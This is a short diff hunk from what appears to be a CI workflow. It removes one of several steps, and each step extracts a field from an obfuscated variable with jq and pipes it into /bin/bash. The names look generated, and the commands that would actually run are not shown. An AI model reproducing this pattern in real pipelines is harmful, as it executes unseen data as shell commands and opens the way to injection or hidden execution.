@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$z7437" | jq -r .twee69 | /bin/bash
           echo $n582 | jq -r .u583 | /bin/bash
           echo $ij3138 | jq -r .ob63 | /bin/bash
-          printf '%s' "$g1997" | jq -r .t6 | /bin/bash
           echo $qegxk0 | jq -r .jetgd50 | /bin/bash
           echo $cbh80 | jq -r .q27 | /bin/bash
           printf '%s' "$v680" | jq -r .s47048 | /bin/bash
